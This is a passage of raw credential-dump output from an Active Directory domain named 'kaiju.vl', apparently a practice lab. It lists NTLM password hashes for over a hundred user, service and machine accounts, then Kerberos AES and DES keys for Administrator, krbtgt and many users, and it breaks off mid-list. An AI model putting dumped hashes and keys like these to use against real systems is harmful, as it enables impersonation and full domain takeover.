kaiju.vl\Stephanie.Johnson:1195:aad3b435b51404eeaad3b435b51404ee:628bd37fc8fe9fcc8e8638d65ee09c39:::
kaiju.vl\Robert.Whittaker:1196:aad3b435b51404eeaad3b435b51404ee:d03ef403d1c1b61fa216fb3de745c3c4:::
kaiju.vl\Deborah.Gray:1197:aad3b435b51404eeaad3b435b51404ee:44ac1447ebbd56c9e65f86ab96ddd95a:::
kaiju.vl\Darren.Stevens:1198:aad3b435b51404eeaad3b435b51404ee:7fbce469f5cd7da5e09b6e0082881d2f:::
kaiju.vl\Howard.Armstrong:1199:aad3b435b51404eeaad3b435b51404ee:5e88fa7319cfe023ec401d387aac211e:::
kaiju.vl\Jonathan.Kelly:1200:aad3b435b51404eeaad3b435b51404ee:dc07fcab96b9922e3eeb6b6cb99dcff3:::
kaiju.vl\Peter.Charlton:1201:aad3b435b51404eeaad3b435b51404ee:7998092c0375f8c2a550d77af640899d:::
kaiju.vl\Tony.Elliott:1202:aad3b435b51404eeaad3b435b51404ee:b5ba4798d273a911454298cae523aa6e:::
kaiju.vl\Megan.Cook:1203:aad3b435b51404eeaad3b435b51404ee:5f9bad6e1f142f45bab5a17c4aa36315:::
kaiju.vl\Samuel.Evans:1204:aad3b435b51404eeaad3b435b51404ee:53823339c94054bf783cd61ea110708b:::
kaiju.vl\Arthur.Powell:1205:aad3b435b51404eeaad3b435b51404ee:4863fa8cd3b0f897e8b44f3596f32e94:::
kaiju.vl\Kyle.Smith:1206:aad3b435b51404eeaad3b435b51404ee:5a49d28b383444a8ad54e8849ef338ef:::
kaiju.vl\Denise.Atkinson:1207:aad3b435b51404eeaad3b435b51404ee:8f69b8a08ff5446626258934bb1cf870:::
kaiju.vl\Emma.Spencer:1208:aad3b435b51404eeaad3b435b51404ee:a11d331b4402c533cd6a4960dcead49c:::
kaiju.vl\Arthur.Stone:1209:aad3b435b51404eeaad3b435b51404ee:b40a99bb6d6b1f683d3e8fab47fd2c31:::
kaiju.vl\David.Rose:1210:aad3b435b51404eeaad3b435b51404ee:251f59399a4acce8a89dc7b843dee128:::
kaiju.vl\Kerry.Campbell:1211:aad3b435b51404eeaad3b435b51404ee:b774eb677690c4c61f6b793577d8bf9f:::
kaiju.vl\Adrian.Harris:1212:aad3b435b51404eeaad3b435b51404ee:3a8b9c9db741bc5703a57a7bd685677f:::
kaiju.vl\Vincent.Palmer:1213:aad3b435b51404eeaad3b435b51404ee:bde241790e01e7c9c62759b37b4f33d7:::
kaiju.vl\Amanda.White:1214:aad3b435b51404eeaad3b435b51404ee:af4e89614df362d03693d6a6cf95f69b:::
kaiju.vl\Mitchell.Jones:1215:aad3b435b51404eeaad3b435b51404ee:1f17cbd61b62bd85ed97e42458273cb2:::
kaiju.vl\Jean.Shepherd:1216:aad3b435b51404eeaad3b435b51404ee:2f513a9530d177d72602e5399173ac67:::
kaiju.vl\Lewis.Johnston:1217:aad3b435b51404eeaad3b435b51404ee:123baa92e73a4c51163d639e516c4ca5:::
kaiju.vl\Reece.Owen:1218:aad3b435b51404eeaad3b435b51404ee:df1ecddcfc0be99a65aa91a0359a21af:::
kaiju.vl\Adam.Randall:1219:aad3b435b51404eeaad3b435b51404ee:e87bb6a61297daa831124f1fe2821538:::
kaiju.vl\Kimberley.Willis:1220:aad3b435b51404eeaad3b435b51404ee:977b0b2ecc992fb654a4833a02c91ec4:::
kaiju.vl\Raymond.Howard:1221:aad3b435b51404eeaad3b435b51404ee:fde7d2d00d0607bfe0801f78c71f5767:::
kaiju.vl\Conor.Price:1222:aad3b435b51404eeaad3b435b51404ee:fcff6ac093e91d3ae96d1b2776227b9c:::
kaiju.vl\Claire.Whitehead:1223:aad3b435b51404eeaad3b435b51404ee:43a1003b926c9a3e61b9057173135625:::
kaiju.vl\Jacob.Coates:1224:aad3b435b51404eeaad3b435b51404ee:843e3c6a1b99f5f25e107e44bbfff349:::
kaiju.vl\Frances.Jordan:1225:aad3b435b51404eeaad3b435b51404ee:1b5dc8eb0fc145e62ddb5288d990ec97:::
kaiju.vl\Rhys.Bowen:1226:aad3b435b51404eeaad3b435b51404ee:2689515829fe243a3ece8db0644159c1:::
kaiju.vl\Nicole.Jones:1227:aad3b435b51404eeaad3b435b51404ee:8b70617bd3d562dfef20b040c1697250:::
kaiju.vl\Sally.Dennis:1228:aad3b435b51404eeaad3b435b51404ee:eb9ab3825ebb46f4d02ce8e1ecdbdba0:::
kaiju.vl\Russell.Bell:1229:aad3b435b51404eeaad3b435b51404ee:d4e3bd7183fd0c550af655ff29be64ba:::
kaiju.vl\Kevin.Smith:1230:aad3b435b51404eeaad3b435b51404ee:fa0aaf1e467aeffc89c0dd95a2700242:::
kaiju.vl\Brian.Campbell:1231:aad3b435b51404eeaad3b435b51404ee:809ddf40557e4d63cd0f73920213f25d:::
kaiju.vl\Rachael.Dickinson:1232:aad3b435b51404eeaad3b435b51404ee:83fd57c1bee75204a4de1211f5074baa:::
kaiju.vl\Gemma.Hunter:1233:aad3b435b51404eeaad3b435b51404ee:1179f3f55241598da970966d557ab4a3:::
kaiju.vl\Catherine.Wall:1234:aad3b435b51404eeaad3b435b51404ee:a27c6e55ca675420a24528252f8f1231:::
kaiju.vl\Jennifer.Brown:1235:aad3b435b51404eeaad3b435b51404ee:47213aae5f0cd6cd5de31f9c1ebc658c:::
kaiju.vl\Douglas.Smith:1236:aad3b435b51404eeaad3b435b51404ee:1ddf24e3bdb2d9b93053f09bd9993321:::
kaiju.vl\Luke.Bradshaw:1237:aad3b435b51404eeaad3b435b51404ee:8c4e7a57b176d95fe583862d46b6e0b0:::
kaiju.vl\Natasha.Foster:1238:aad3b435b51404eeaad3b435b51404ee:db7c5190be0ac47f8ef5789385b7b7da:::
kaiju.vl\June.Edwards:1239:aad3b435b51404eeaad3b435b51404ee:827f048e55baa45743d702e03519744e:::
kaiju.vl\Kimberley.Richards:1240:aad3b435b51404eeaad3b435b51404ee:93413aefe6940f090cb4baa9d77cf4d4:::
kaiju.vl\Gerald.Miller:1241:aad3b435b51404eeaad3b435b51404ee:daa7a6bf52c2ff083b3ec4f25f8837ea:::
kaiju.vl\Ashley.Davison:1242:aad3b435b51404eeaad3b435b51404ee:c54985743feb9aab539cbb7c6687d423:::
kaiju.vl\Martyn.Rogers:1243:aad3b435b51404eeaad3b435b51404ee:9b03e46b7d2fa39bbd00b0fe0f9b654f:::
kaiju.vl\Kerry.Watson:1244:aad3b435b51404eeaad3b435b51404ee:6ae403455a51eacbc48008f6c7364f5c:::
kaiju.vl\Tracy.Pearson:1245:aad3b435b51404eeaad3b435b51404ee:6e6822b5b8f221d865b1bcce1b16ffe7:::
kaiju.vl\Vanessa.Nelson:1246:aad3b435b51404eeaad3b435b51404ee:1c418ac2864bcea4a9df30477032b3b0:::
kaiju.vl\Barbara.Johnson:1247:aad3b435b51404eeaad3b435b51404ee:464abedf5e77611e242969419390dbfd:::
kaiju.vl\Marian.Willis:1248:aad3b435b51404eeaad3b435b51404ee:d136d6b48542e2fb3aa1b4e1a8c0aee7:::
kaiju.vl\Joel.Kelly:1249:aad3b435b51404eeaad3b435b51404ee:85d0c33b4f5a5a3677dfa7ce94d54709:::
kaiju.vl\Kimberley.Bird:1250:aad3b435b51404eeaad3b435b51404ee:fab0a5891e1fec80fb21dd0c142ae5ce:::
kaiju.vl\Elliott.Barker:1251:aad3b435b51404eeaad3b435b51404ee:e2596aa160b482734cd7b6c669be4efd:::
kaiju.vl\Adrian.Simpson:1252:aad3b435b51404eeaad3b435b51404ee:e7c83d935ae4328fc31243ecd3e404ad:::
kaiju.vl\Carolyn.Lewis:1253:aad3b435b51404eeaad3b435b51404ee:f173ff79a32cdf64b1cb7f80d8d0c640:::
kaiju.vl\Clare.Frost:1254:aad3b435b51404eeaad3b435b51404ee:be167f930e461f6e0909786c3fb68017:::
kaiju.vl\Kate.Martin:1255:aad3b435b51404eeaad3b435b51404ee:25545a2f0063c2457e949bdd76b98799:::
kaiju.vl\Wendy.Murphy:1256:aad3b435b51404eeaad3b435b51404ee:191b868628d253b911121539465ffcb8:::
kaiju.vl\Kevin.Webb:1257:aad3b435b51404eeaad3b435b51404ee:a420fe5b7bbf8e8b8f2c880c89f1908b:::
kaiju.vl\Robert.Owen:1258:aad3b435b51404eeaad3b435b51404ee:14d8a710cb51e8a9459f7bdd75b5cc09:::
kaiju.vl\Suzanne.Baldwin:1259:aad3b435b51404eeaad3b435b51404ee:892390ab70f2fc9d11327d0df782f555:::
kaiju.vl\Jason.Spencer:1260:aad3b435b51404eeaad3b435b51404ee:4ee70c6ec73fbe8b8f64c9f88256dd82:::
kaiju.vl\Ian.Reeves:1261:aad3b435b51404eeaad3b435b51404ee:cdf3d6b0ce63b2126d125d35e1d6bcc2:::
kaiju.vl\Sara.Shaw:1262:aad3b435b51404eeaad3b435b51404ee:5cbec8f0061d9ecfbf69bc619624e346:::
kaiju.vl\Callum.Smith:1263:aad3b435b51404eeaad3b435b51404ee:6c4898d9c6be95e2d33a9a70a8177bdf:::
kaiju.vl\Stewart.Powell:1264:aad3b435b51404eeaad3b435b51404ee:5aac8b9d5a43b04f4fbedbb7cd0e874f:::
kaiju.vl\Paula.Matthews:1265:aad3b435b51404eeaad3b435b51404ee:561fdb736388fe09c312d2526641fe96:::
kaiju.vl\Michael.Ball:1266:aad3b435b51404eeaad3b435b51404ee:ec38e3492c783d06dab646d2ef36f487:::
kaiju.vl\Amelia.Ali:1267:aad3b435b51404eeaad3b435b51404ee:bbf543c44e09d600aa99a753d36efe99:::
kaiju.vl\Dylan.Jones:1268:aad3b435b51404eeaad3b435b51404ee:68310fc16a7317371f58a8dfb7956b82:::
kaiju.vl\Jeffrey.Whittaker:1269:aad3b435b51404eeaad3b435b51404ee:bca10da283593a1dfe3da1ca20043be0:::
kaiju.vl\Kirsty.Smart:1270:aad3b435b51404eeaad3b435b51404ee:62395e9a1940904cf8f974f8326ad7a8:::
kaiju.vl\Sharon.Taylor:1271:aad3b435b51404eeaad3b435b51404ee:50d661ed56d4874fd9470f840d0ef921:::
kaiju.vl\Jeremy.Tucker:1272:aad3b435b51404eeaad3b435b51404ee:66e2497efe11c7b268349ef8f6abe244:::
kaiju.vl\Gemma.Jackson:1273:aad3b435b51404eeaad3b435b51404ee:508adebf279e516c2ec001dccb6e0b80:::
kaiju.vl\Abigail.Greenwood:1274:aad3b435b51404eeaad3b435b51404ee:31aaf8de8e92160f0e828f43bcf97601:::
kaiju.vl\Simon.Clark:1275:aad3b435b51404eeaad3b435b51404ee:14f3e44b1a85f768c14d80f3e1a3230e:::
kaiju.vl\Hollie.Edwards:1276:aad3b435b51404eeaad3b435b51404ee:388f2b5fddf9adfc66fa749ae1044cb8:::
kaiju.vl\Darren.Parker:1277:aad3b435b51404eeaad3b435b51404ee:786352a0df2bab8745a99802a0c28f04:::
kaiju.vl\Nicole.Morris:1278:aad3b435b51404eeaad3b435b51404ee:d0c635ef0fd085f3f618bb64c21132b1:::
kaiju.vl\Stephanie.Griffiths:1279:aad3b435b51404eeaad3b435b51404ee:fd018f13fa00069a8384e42864d1957b:::
kaiju.vl\Robert.Reeves:1280:aad3b435b51404eeaad3b435b51404ee:4a5005cff70fd1cf4645be7dd9a91350:::
kaiju.vl\Marie.Hall:1281:aad3b435b51404eeaad3b435b51404ee:6a3c4f6db67e84462b27960165a6471c:::
kaiju.vl\Barbara.Gray:1282:aad3b435b51404eeaad3b435b51404ee:4e9b14efedb63c8f1ffcc97a7e6617c7:::
kaiju.vl\Damien.Page:1283:aad3b435b51404eeaad3b435b51404ee:caf2d8b41810c3e92c35b6186ae5425f:::
kaiju.vl\Ruth.Harrison:1284:aad3b435b51404eeaad3b435b51404ee:3a3073c3c89a61b882f30b03658ceb8f:::
kaiju.vl\Jake.Middleton:1285:aad3b435b51404eeaad3b435b51404ee:a7ce4a5ef0806dbd897c21fb02a84018:::
kaiju.vl\Paul.Newman:1286:aad3b435b51404eeaad3b435b51404ee:fc664429adf10b50f9e5aac7bad72e51:::
kaiju.vl\Paula.Jackson:1287:aad3b435b51404eeaad3b435b51404ee:473706c56bf25169f1c181669d17f546:::
kaiju.vl\Jean.Robinson:1288:aad3b435b51404eeaad3b435b51404ee:4464f11f637e6f7e5108efd3678e0cbc:::
kaiju.vl\James.Tucker:1289:aad3b435b51404eeaad3b435b51404ee:d1ec1f94f21492f86569426552fcd956:::
kaiju.vl\Duncan.Williams:1290:aad3b435b51404eeaad3b435b51404ee:cdc6f11e4e61a8e6a22b92438defa784:::
kaiju.vl\Gregory.Shah:1291:aad3b435b51404eeaad3b435b51404ee:559faedd5adf861f201083cbc4031902:::
kaiju.vl\Jeremy.Wilson:1292:aad3b435b51404eeaad3b435b51404ee:06f3dd1ed98a6ab2e82d1d37e19822ec:::
kaiju.vl\Terry.Smith:1293:aad3b435b51404eeaad3b435b51404ee:a4d0890095e974b7a21b3416bccefe52:::
kaiju.vl\Gillian.Fletcher:1294:aad3b435b51404eeaad3b435b51404ee:2306b8a35cd11eb8559aec9b1363460a:::
kaiju.vl\Clifford.Jordan:1295:aad3b435b51404eeaad3b435b51404ee:2720a1af894866fcad0c624fdf41d1f0:::
kaiju.vl\Billy.Perkins:1296:aad3b435b51404eeaad3b435b51404ee:654c65d6a1900c026f15d1925c6f1388:::
kaiju.vl\Josephine.Holmes:1297:aad3b435b51404eeaad3b435b51404ee:f14ef82c974685edf55ddf2ea3e642d9:::
kaiju.vl\Jack.Bray:1298:aad3b435b51404eeaad3b435b51404ee:61338e4a57102ddf9beb1485bc1acddb:::
kaiju.vl\Bernard.Griffiths:1299:aad3b435b51404eeaad3b435b51404ee:f5380c292366b7040d2a30d5ee7e48c7:::
kaiju.vl\Laura.Wright:1300:aad3b435b51404eeaad3b435b51404ee:7b3b644120ff10b3d090f32a39c7aad3:::
kaiju.vl\Albert.Harvey:1301:aad3b435b51404eeaad3b435b51404ee:31625a6f1690a47feab2c2ee4e35541e:::
kaiju.vl\Sheila.Davidson:1302:aad3b435b51404eeaad3b435b51404ee:24951ad347b2c4b46720efd1e824ae07:::
kaiju.vl\Damien.Bull:1303:aad3b435b51404eeaad3b435b51404ee:0d4d4c801cc80e4293c50e4eb741c788:::
kaiju.vl\John.Chapman:1304:aad3b435b51404eeaad3b435b51404ee:0c1b660fc7531a1f2d1f0871683c15f6:::
kaiju.vl\Janice.Bibi:1305:aad3b435b51404eeaad3b435b51404ee:6399a28bf474191733dd041eebc5832d:::
kaiju.vl\ldapsvc:2101:aad3b435b51404eeaad3b435b51404ee:5044ad9c04bc8ec619c11a311d08e107:::
krbtgt_2450:3102:aad3b435b51404eeaad3b435b51404ee:4a892241b9c1052a4ab9eca4f7d12768:::
BERSRV100$:1000:aad3b435b51404eeaad3b435b51404ee:cb55efa44db748ef937ff963713cb40d:::
BERSRV200$:1103:aad3b435b51404eeaad3b435b51404ee:8ac8ef1db4beada03a9794c971292d1e:::
BERSRV105$:3101:aad3b435b51404eeaad3b435b51404ee:267e0dadac1293f6aee423e7141bc1f9:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:70452dc4ffc11d1e35d72ad28ba96907ab3311159119891343a1fa9dddd18240
Administrator:aes128-cts-hmac-sha1-96:3753b9ede5057bd0242b4a248e8e3c3c
Administrator:des-cbc-md5:da7c0202cef8fe5e
krbtgt:aes256-cts-hmac-sha1-96:0c4d3c196152e80b70c7216426ee1714e4c535c274bc0147cd31a6d51c1d99ea
krbtgt:aes128-cts-hmac-sha1-96:80d6c41c6bcfbf9f57ced1a91d352716
krbtgt:des-cbc-md5:7fe64386830de0bc
kaiju.vl\sasrv200:aes256-cts-hmac-sha1-96:0ffa83179626e39af4d64df7aff7c378cca3c8f589109db993ab3ea83894d8be
kaiju.vl\sasrv200:aes128-cts-hmac-sha1-96:875dbffa4d560858d4b059c49545479e
kaiju.vl\sasrv200:des-cbc-md5:61e051072cb64c34
kaiju.vl\Rebecca.Lewis:aes256-cts-hmac-sha1-96:823f17c38bbdcfaa8e700bbd89f09a3ede445654c2f7bcd1f38c05e1818db565
kaiju.vl\Rebecca.Lewis:aes128-cts-hmac-sha1-96:c7be0d7f866913cb366331802f8f9f9d
kaiju.vl\Rebecca.Lewis:des-cbc-md5:2a8346d97508efb6
kaiju.vl\Lynne.Smith:aes256-cts-hmac-sha1-96:937ac308af19ca3cf079ae7c3645c1c7e500a7368cfd1a6c8da76809da536936
kaiju.vl\Lynne.Smith:aes128-cts-hmac-sha1-96:ef1fe2f9eb04bb75873e0b9137cb9fa3
kaiju.vl\Lynne.Smith:des-cbc-md5:37ea6d439bf29179
kaiju.vl\Marcus.Whitehead:aes256-cts-hmac-sha1-96:1ef343c36ac4c2fc213dfb5a9038a7a1d45f5ec3d47abc9bc5803c07f475bad5
kaiju.vl\Marcus.Whitehead:aes128-cts-hmac-sha1-96:daaa5a0665b56168ca9e2f882d77cdbb
kaiju.vl\Marcus.Whitehead:des-cbc-md5:b96e6ddfe9e96820
kaiju.vl\Michael.Scott:aes256-cts-hmac-sha1-96:e929c714c88232060879b02bc956f1f59d7b7005edc6d858029ab8394172dc56
kaiju.vl\Michael.Scott:aes128-cts-hmac-sha1-96:d832d5f5cc35e41add8808813440c06e
kaiju.vl\Michael.Scott:des-cbc-md5:fbbc57c8e57f92da
kaiju.vl\Rebecca.Carter:aes256-cts-hmac-sha1-96:0d81b44f10bd163547bf627e5b36f36b67129b003fedb36ed72b88dfd9f7b606
kaiju.vl\Rebecca.Carter:aes128-cts-hmac-sha1-96:6cda8ae278c1139ccec567b89302ed0d
kaiju.vl\Rebecca.Carter:des-cbc-md5:a2d9d610eff87ac8
kaiju.vl\Marion.Smith:aes256-cts-hmac-sha1-96:698052c66584561f718fcc882af381bcbf404db720b9d0d2b46a48b704198b02
kaiju.vl\Marion.Smith:aes128-cts-hmac-sha1-96:9724e40371366cc89cd2af3d4f8e61a9
kaiju.vl\Marion.Smith:des-cbc-md5:54e034cb08085bc1
kaiju.vl\Tina.Holt:aes256-cts-hmac-sha1-96:7d2f1297dfa15345e8286fdb58d399ef6e790a10a1309330e7c545c69d6f2164
kaiju.vl\Tina.Holt:aes128-cts-hmac-sha1-96:e7c2f665970c8075fcbe01f0c209ef43
kaiju.vl\Tina.Holt:des-cbc-md5:c7169efe612ce316
kaiju.vl\Phillip.George:aes256-cts-hmac-sha1-96:86a007dee7b2735647cd2a127bd043630de149b22990bd77381ce28194e29fed
kaiju.vl\Phillip.George:aes128-cts-hmac-sha1-96:59b628c1023d5d6d185ddaa51a481971
kaiju.vl\Phillip.George:des-cbc-md5:d9ad94436e3429fd
kaiju.vl\Linda.Patel:aes256-cts-hmac-sha1-96:4394af381534a75dba06998b2075b20bc4c6c6ec415d2e157947a8dbd62106a0
kaiju.vl\Linda.Patel:aes128-cts-hmac-sha1-96:976d206bfd3f69a3e56bc15716a3d996
kaiju.vl\Linda.Patel:des-cbc-md5:73ab7cfbabb610a4
kaiju.vl\Susan.Palmer:aes256-cts-hmac-sha1-96:5492fc44675fcd205cacb5089bd331e3d0e67c097bcb7dbcac3af6706ceb30b9
kaiju.vl\Susan.Palmer:aes128-cts-hmac-sha1-96:662dbea4ac587442cd68561f484bc483
kaiju.vl\Susan.Palmer:des-cbc-md5:6b541a51a7a1263b
kaiju.vl\Jodie.Hudson:aes256-cts-hmac-sha1-96:511974149f1c2dae0b7ad164199d3594adb621d26c667187ee19d05d1e840ed1
kaiju.vl\Jodie.Hudson:aes128-cts-hmac-sha1-96:8edb08a275cca1ede258000a6e22b5d4
kaiju.vl\Jodie.Hudson:des-cbc-md5:d667fb4320a2bf9e
kaiju.vl\Anthony.Gordon:aes256-cts-hmac-sha1-96:b015b99df28de2129008415d3c80a699bf81e20fe4625a76c602b28b46a6ba1d
kaiju.vl\Anthony.Gordon:aes128-cts-hmac-sha1-96:b46eb848b62e8ce0da50133fd9b1c2c6
kaiju.vl\Anthony.Gordon:des-cbc-md5:9b0b83a2981fa276
kaiju.vl\Lindsey.Taylor:aes256-cts-hmac-sha1-96:7bec3b43671726d3ec6b027b5aa8c5930a608d09de5b638b01fbe709b8159255
kaiju.vl\Lindsey.Taylor:aes128-cts-hmac-sha1-96:19ccab0e436df43fe099e8a6f525c86e
kaiju.vl\Lindsey.Taylor:des-cbc-md5:6e04fb7326348a68
kaiju.vl\Dawn.McLean:aes256-cts-hmac-sha1-96:f6624b4ca83ab41690efe58996d665a61b848973a9a57b87d69fe65ca140cbbc
kaiju.vl\Dawn.McLean:aes128-cts-hmac-sha1-96:772c5d040f311f41aed5d18d1dbcec1c
kaiju.vl\Dawn.McLean:des-cbc-md5:a854a2a22a89c8ea
kaiju.vl\Shane.Warner:aes256-cts-hmac-sha1-96:ce8624123d2925e10ca9998f9975304ab5be42e428c4a5344d3b6944bd3952ab
kaiju.vl\Shane.Warner:aes128-cts-hmac-sha1-96:992d5984cde996b5dc67f826cef8b7bf
kaiju.vl\Shane.Warner:des-cbc-md5:6ed645d951d3a198
kaiju.vl\Carolyn.Wood:aes256-cts-hmac-sha1-96:0c1c5b8ec203afa85a84c1b5cc621f1219e1e4cf6abe4106edb917796f1974bb
kaiju.vl\Carolyn.Wood:aes128-cts-hmac-sha1-96:e57eeeaab3377ba069f922d1f0d19f31
kaiju.vl\Carolyn.Wood:des-cbc-md5:8062e0f73b92400e
kaiju.vl\Rita.McDonald:aes256-cts-hmac-sha1-96:72e1b9202caa21a1b8b74ed7edcc60af914526e4cd1b91b84d4ba43ad30afbbc
kaiju.vl\Rita.McDonald:aes128-cts-hmac-sha1-96:2ae9ecdedbca85738ef0b48cdbe2594f
kaiju.vl\Rita.McDonald:des-cbc-md5:02d0bc166185e980
kaiju.vl\Sally.Campbell:aes256-cts-hmac-sha1-96:e3c73f110d790dea1498aba66e4f9eae4aca507e8e8b654a6edc75336796eb56
kaiju.vl\Sally.Campbell:aes128-cts-hmac-sha1-96:8cab577242247bf7ddfcc6c732cdb48d
kaiju.vl\Sally.Campbell:des-cbc-md5:d0029b979186cd15
kaiju.vl\Elliott.Taylor:aes256-cts-hmac-sha1-96:0cf27809b15ac381069b57c72017440cd9394b57b32152ccbbf20e6108ef1cae
kaiju.vl\Elliott.Taylor:aes128-cts-hmac-sha1-96:75be173d2e9474b26032fc9cf03b159e
kaiju.vl\Elliott.Taylor:des-cbc-md5:016401709d89b93d
kaiju.vl\Jill.Davies:aes256-cts-hmac-sha1-96:d6ff5ee892ebf4bcebed4ad4563aa25bef7bc91e179748bc3a6b177c2b19e60b
kaiju.vl\Jill.Davies:aes128-cts-hmac-sha1-96:e57fa51ba70b425b03adfdb99c99ebaa
kaiju.vl\Jill.Davies:des-cbc-md5:54203d455be525ae
kaiju.vl\Joanna.Pritchard:aes256-cts-hmac-sha1-96:9828c860007a1b8c9215f985bd1f5c7d90be1973b848149b0602d1e67fe4f15d
kaiju.vl\Joanna.Pritchard:aes128-cts-hmac-sha1-96:070f6fa0304325a6dcdd5aeefff939c2
kaiju.vl\Joanna.Pritchard:des-cbc-md5:98abdc57fe5186f4
kaiju.vl\Mary.Turner:aes256-cts-hmac-sha1-96:8f1b9762f35c18ef071ca8a54f619533b29a6f7fc4480c5147b9f66c7e2b02a4
kaiju.vl\Mary.Turner:aes128-cts-hmac-sha1-96:bdfb7da59fd63cc0af78a3d4b5658380
kaiju.vl\Mary.Turner:des-cbc-md5:8af29246ad266ba8
kaiju.vl\Gerald.Scott:aes256-cts-hmac-sha1-96:aaa1edee0ce961a2af3a5f5c200221bf8975f1fb6567da33609a68f2e071239e
kaiju.vl\Gerald.Scott:aes128-cts-hmac-sha1-96:f2d7e8f51a27ef204cdc27b2d008ecfb
kaiju.vl\Gerald.Scott:des-cbc-md5:f8d9028f6d0b0213
kaiju.vl\Elaine.Heath:aes256-cts-hmac-sha1-96:0f6bd8a3ec4bd2081b8d4fed9884815bfd287adcefa80244cc121181b97c26f6
kaiju.vl\Elaine.Heath:aes128-cts-hmac-sha1-96:321b81923516c74a769e2eedd00ec58b
kaiju.vl\Elaine.Heath:des-cbc-md5:e6b9c2f7804c3791
kaiju.vl\Sophie.Young:aes256-cts-hmac-sha1-96:a59836b013ccc9d038ffcca18191064105743b8452ef18fb4a6709a211ec0b53
kaiju.vl\Sophie.Young:aes128-cts-hmac-sha1-96:4b0ddf7c29458fb94a34aea4241b3818
kaiju.vl\Sophie.Young:des-cbc-md5:bc08ad5b19cd49fd
kaiju.vl\Charlotte.Watkins:aes256-cts-hmac-sha1-96:5a734ca6915610928a1aaeb3d2a4e10934c33aa1a97267742930b9906f71c856
kaiju.vl\Charlotte.Watkins:aes128-cts-hmac-sha1-96:b691e8220f428db9795ad511b9393b73
kaiju.vl\Charlotte.Watkins:des-cbc-md5:b549979bdc989ba1
kaiju.vl\Lynda.Wilson:aes256-cts-hmac-sha1-96:c39e0c4c1692e554a317610ecb1dcbf234f20e79b67da80b7c426b41d30e02a7
kaiju.vl\Lynda.Wilson:aes128-cts-hmac-sha1-96:806e7a885b33ec979c5f0d08d5f11ff8
kaiju.vl\Lynda.Wilson:des-cbc-md5:2ab97ab645b3434a
kaiju.vl\Nigel.Brennan:aes256-cts-hmac-sha1-96:16a4078b333125af7e8a2ca4493e47c726b9a3a055dac73db0b5e96495dad64c
kaiju.vl\Nigel.Brennan:aes128-cts-hmac-sha1-96:75abe2cc810565bdcfb4aaf52b039b4d
kaiju.vl\Nigel.Brennan:des-cbc-md5:b5b354fde5d0b5c4
kaiju.vl\Megan.Dunn:aes256-cts-hmac-sha1-96:6873d1a475c469185d5aeab5ac2f4f74e932cd68960b0d1138a10cdd2ce8abe3
kaiju.vl\Megan.Dunn:aes128-cts-hmac-sha1-96:dc6193f3eb823e07eae443ad38459237
kaiju.vl\Megan.Dunn:des-cbc-md5:d99b75efe5b5ad23
kaiju.vl\Kieran.Bennett:aes256-cts-hmac-sha1-96:02d1bbf6e30f8029ddd1494492943e13b426376b0f90d35f56cea1290b57550e
kaiju.vl\Kieran.Bennett:aes128-cts-hmac-sha1-96:de54724492386e5a4c9fb92307ff21b8
kaiju.vl\Kieran.Bennett:des-cbc-md5:cb67797310b9d53b
kaiju.vl\Karl.Lawrence:aes256-cts-hmac-sha1-96:f15d5f299117d63a7a864abc728265392ab6b5c6998b0dffef430441acbc6348
kaiju.vl\Karl.Lawrence:aes128-cts-hmac-sha1-96:3d7ae020d5606056f4df9b1639a6f284
kaiju.vl\Karl.Lawrence:des-cbc-md5:9e677a91b3739776
kaiju.vl\Jane.Davies:aes256-cts-hmac-sha1-96:38fde91de0618b6fb0d886c6fabea7a25cba3478acd26fc9ab53750b5221b951
kaiju.vl\Jane.Davies:aes128-cts-hmac-sha1-96:154229353384aebc6924e2731dfdb1b3
kaiju.vl\Jane.Davies:des-cbc-md5:13434ab325c27016
kaiju.vl\Sian.King:aes256-cts-hmac-sha1-96:9c32ff6d2ac79e55ff67afc2c1f58b380f60240a761b677bd1bb43b17426a6a2
kaiju.vl\Sian.King:aes128-cts-hmac-sha1-96:757af4f5cef6842368acae2a9f0b7828
kaiju.vl\Sian.King:des-cbc-md5:232afe0d01164a19
kaiju.vl\Clare.Hargreaves:aes256-cts-hmac-sha1-96:e82ac3678f29d7a8fa1aef246dca343284a9632c9bc017247c2cca92c49a5d7e
kaiju.vl\Clare.Hargreaves:aes128-cts-hmac-sha1-96:6c661be20b194596073bb63c254be5fa
kaiju.vl\Clare.Hargreaves:des-cbc-md5:343e6402b6c1f88f
kaiju.vl\Hilary.Wallis:aes256-cts-hmac-sha1-96:21f71f2a5a5e107ce6f602746f91560f673dece1a1c38c7eaf8a7a8e0ffeddd8
kaiju.vl\Hilary.Wallis:aes128-cts-hmac-sha1-96:80f2d764c7cfa8096f4d5c28e9a3d7de
kaiju.vl\Hilary.Wallis:des-cbc-md5:075e1f38c4b679b5
kaiju.vl\Sheila.Smith:aes256-cts-hmac-sha1-96:dc492d5417cbae848b7fff782f9cd866232a4de62e337f5cf437518fafe29502
kaiju.vl\Sheila.Smith:aes128-cts-hmac-sha1-96:0560e2edeacfc6eb29a1cce859e7421d
kaiju.vl\Sheila.Smith:des-cbc-md5:854c25a78ab07362
kaiju.vl\Emma.Watson:aes256-cts-hmac-sha1-96:5a7b05adb2b1c8dcf9e050b8b1caab2caad00533e12fd715aaca5133439c3020
kaiju.vl\Emma.Watson:aes128-cts-hmac-sha1-96:22062544706f413f3dcbae3db7726adc
kaiju.vl\Emma.Watson:des-cbc-md5:7c2f8a0404199dc8
kaiju.vl\Hazel.Connolly:aes256-cts-hmac-sha1-96:8a33dd6955547fc27bc0cd9284f811fb0793cff732ada6bdc56fc3d08ec988f7
kaiju.vl\Hazel.Connolly:aes128-cts-hmac-sha1-96:f10053e300cc29ecc13167d86019016c
kaiju.vl\Hazel.Connolly:des-cbc-md5:62e532c73d83fbd6
kaiju.vl\Trevor.Walker:aes256-cts-hmac-sha1-96:7b343a5ba4c467d9076bbb53743288bcc57de8009c9f9f1234e7bfadd5134c40
kaiju.vl\Trevor.Walker:aes128-cts-hmac-sha1-96:178047160a51223a5f39c512dbc1714d
kaiju.vl\Trevor.Walker:des-cbc-md5:97dc70b9195276e6
kaiju.vl\Ian.Cunningham:aes256-cts-hmac-sha1-96:a36b740f81997bd4acc63c5a68e9737dde9deb7ec60a53c8d52b486ba4706bdc
kaiju.vl\Ian.Cunningham:aes128-cts-hmac-sha1-96:0806e52558990daa1f8f1a57ffab3bc1
kaiju.vl\Ian.Cunningham:des-cbc-md5:807c073801199e91
kaiju.vl\Duncan.Phillips:aes256-cts-hmac-sha1-96:6b10bc16fe8d2f25ed854f6ccbeeebfea6ebf1d5d96be656876d91f1bbe2fd76
